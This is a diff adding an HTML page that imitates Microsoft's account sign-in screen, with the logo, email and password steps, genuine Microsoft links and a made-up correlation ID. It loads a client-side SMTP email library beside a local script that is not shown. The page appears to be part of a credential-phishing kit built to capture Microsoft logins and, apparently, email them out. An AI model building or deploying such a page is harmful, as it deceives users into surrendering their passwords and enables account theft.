@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Sign in to your Microsoft account</title>
+    <link rel="shortcut icon" href="img/microsoft_PNG18.png" type="image/x-icon">
+    <link rel="stylesheet" href="fontawesome-free-5.10.1-web/css/all.css" type="text/css"/>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <main>
+        <div id="form-holder">
+            <img class="sign-in" src="img/microsoft_logo.svg" alt="logo" id="ms-logo">
+            <h2 class="sign-in-content sign-in">Sign in</h2>
+            <p class="error-message sign-in">That Microsoft account doesn't exist. Enter a different account or <a href="https://signup.live.com/signup?wa=wsignin1.0&rpsnv=13&ct=1565220060&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3da1e8e8cb-3a14-e903-3c96-706bdfe6c9ec&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&pid=0&contextid=E36BF1753B26B294&bk=1565424303&uiflavor=web&mkt=EN-US&lc=1033&uaid=872f6832bc454f95aa40281782ee32e7&nw=3G">get a new one</a>.</p>
+            <input class="sign-in-content sign-in" type="email" name="loginfmt" maxlength="113" lang="en" class="form-control ltr_override" aria-required="true" aria-label="Enter your email, phone, or Skype." aria-describedby="loginHeader" placeholder="Email, phone, or Skype">
+            <p class="sign-in-content sign-in">No account? <a href="https://signup.live.com/signup?wa=wsignin1.0&amp;rpsnv=13&amp;ct=1565220060&amp;rver=7.0.6737.0&amp;wp=MBI_SSL&amp;wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3da1e8e8cb-3a14-e903-3c96-706bdfe6c9ec&amp;id=292841&amp;aadredir=1&amp;CBCXT=out&amp;lw=1&amp;fl=dob%2cflname%2cwld&amp;cobrandid=90015&amp;contextid=0806E5BA5DA72AAA&amp;bk=1565222761&amp;uiflavor=web&amp;mkt=EN-US&amp;lc=1033&amp;uaid=97ff2ef4536c492291d2e93971a379da" id="signup" aria-label="Create a Microsoft account" name="createAccount">Create one!</a></p>
+            <p class="sign-in-content sign-in"><a href="">Sign-in options</a></p>
+            <div class="sign-in-content sign-in" id="submit">
+                <button>Next</button>
+            </div>
+            <p class="sign-up"><button id="back-icon"><i class="fas fa-arrow-left"></i></button> <span id="user-info"></span></p>
+            <h2 class="sign-up">Enter password</h2>
+            <p class="error-message sign-up">Your account or password is incorrect. If you don't remember your password, <a id="reset-password">reset it now</a>.</p>
+            <input name="passwd" type="password" id="i0118" class="sign-up" autocomplete="off" placeholder="Password">
+            <p class="sign-up" id="keep-logged"><input type="checkbox"> Keep me signed in</p>
+            <p class="sign-up"><a href="">Forgot my password</a></p>
+            <div class="sign-up" id="submit">
+                <button id="sign-in-btn">Sign in</button>
+            </div>
+            <div id="cover">
+                <img src="img/803.gif" alt="loading">
+            </div>
+        </div>
+        <div class="message" hidden>
+            <p><b>Correlation Id:</b> 872f6832bc454f95aa40281782ee32e7</p>
+            <p><b>Timestamp:</b> 2019-08-08T19:25:33.813Z</p>
+        </div>
+    </main>
+    <footer>
+        <a href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&mkt=EN-US&vv=1600&uaid=97ff2ef4536c492291d2e93971a379da">Terms of use</a>
+        <a href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&mkt=EN-US&vv=1600&uaid=97ff2ef4536c492291d2e93971a379da">Privacy &amp; cookies</a>
+        <button><img src="img/ellipsis_white.svg" alt="more" id="image-button"></button>
+    </footer>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script src="jquery.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
